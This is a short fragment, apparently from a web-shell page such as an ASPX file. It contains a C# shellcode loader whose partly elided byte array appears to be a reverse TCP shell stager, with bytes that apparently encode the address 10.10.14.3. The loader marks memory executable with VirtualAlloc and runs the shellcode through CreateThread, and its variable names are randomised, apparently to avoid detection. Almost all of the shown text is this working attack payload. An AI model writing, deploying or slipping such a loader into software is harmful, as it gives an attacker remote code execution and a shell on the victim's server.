...
0x68,0x0a,0x0a,0x0e,0x03,0x68,0x02,0x00,0x36,0xb0,0x89,0xe6,0x50,0x50,0x50,0x50,0x40,0x50,0x40,0x50,0x68,0xea,0x0f,0xdf,0xe0,
...
0xc3,0x29,0xc6,0x75,0xc1,0xc3,0xbb,0xf0,0xb5,0xa2,0x56,0x6a,0x00,0x53,0xff,0xd5 };
        ...
        IntPtr cAk0SgyR = VirtualAlloc(IntPtr.Zero,(UIntPtr)a9mvwU3S2z.Length,MEM_COMMIT, PAGE_EXECUTE_READWRITE);
        System.Runtime.InteropServices.Marshal.Copy(a9mvwU3S2z,0,cAk0SgyR,a9mvwU3S2z.Length);
        IntPtr xMWP0h6H = IntPtr.Zero;
        IntPtr mJBmrlaaw = CreateThread(IntPtr.Zero,UIntPtr.Zero,cAk0SgyR,IntPtr.Zero,0,ref xMWP0h6H);
    }
</script>
